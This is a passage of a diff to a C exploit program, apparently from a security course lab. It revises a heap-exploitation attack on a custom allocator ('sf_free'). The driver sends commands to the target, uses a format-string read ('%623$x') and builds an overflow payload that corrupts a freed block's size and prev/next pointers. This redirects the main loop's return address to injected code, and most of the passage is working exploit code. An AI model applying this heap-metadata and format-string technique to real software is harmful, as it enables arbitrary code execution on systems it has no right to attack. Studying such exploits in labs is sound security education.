@@ -183,8 +183,8 @@ int main(int argc, char* argv[]) {
 
    // In the next few lines, we allocate two blocks such that when they are
    // coalesced in sf_free their combined size becomes zero. This gives us
-   // an opportunity to corrupt the coalesced block before it is used by a 
-   // subsequent malloc call
+   // an opportunity to corrupt the coalesced block after it is freed and
+   // before it is used by a subsequent malloc call
    put_str("p xyz\n");
    send();
    put_str("e %623$x\n");
@@ -210,32 +210,34 @@ int main(int argc, char* argv[]) {
    put_str("\n");
    send();
 
-   put_str("u divider\n");
+   put_str("u divider\n"); // unused, but needed to prevent coalescing of next block
    send();
    put_str("u real\n");
    send();
-   
+
    put_str("l\n");
    send();
 
-   // Wait for l command to run
    usleep(100000);
-   get_formatted("%*s");
 
-   // We now have a block of size in the freelist. Now we corrupt that block's pointers
-   // and reset its size so it is chosen for the next malloc request.
-   new_size = 2 * blocksz - 3 * sizeof(int) + 8;
-   explsz = payloadsz + blocksz;
+   // Our target block (with size zero) is now in the freelist. We allocate another block
+   // at a lower address and execute a heap overflow to corrupt the target block's pointers
+   // and reset its size.
+   unsigned target_offset = payloadsz + 2 * blocksz;
+
+   new_size = 2 * blocksz - sizeof(int);  // Needs to be at least 7; exact value not important
+   explsz = payloadsz + 2 * blocksz + 20; // 20 is free header size
    expl = (void**)malloc(explsz);
    
    memset((void*)expl, '\0', explsz);
 
-   expl[payloadsz/sizeof(void*) + 1] = (void*)new_size;                 // coalesced->size = original value 
-   expl[blocksz/sizeof(void*)] = (void*)code_addr;                      // coalesced->prev = code_addr
-   expl[blocksz/sizeof(void*) + 1] = (void*)(cur_mainloop_ra_loc - 12); // coalesced->next = ML_RA - 12
+   expl[target_offset/sizeof(void*) + 1] = (void*)new_size;                   // coalesced->size = original value 
+   expl[target_offset/sizeof(void*) + 3] = (void*)code_addr;                  // coalesced->prev = code_addr
+   expl[target_offset/sizeof(void*) + 4] = (void*)cur_mainloop_ra_loc - 12;   // coalesced->next = ML_RA - 12
 
-   // "real" u block will be at head of freelist. This call will remove it.
-   put_str("p xyz\n");
+   // plen is currently 500; allocate a smaller block so that changes
+   // Note: this block will be allocated by a direct call to mmap
+   put_str("p abc\n");
    send();
 
    // Execute second overflow (this is where the "magic" happens)
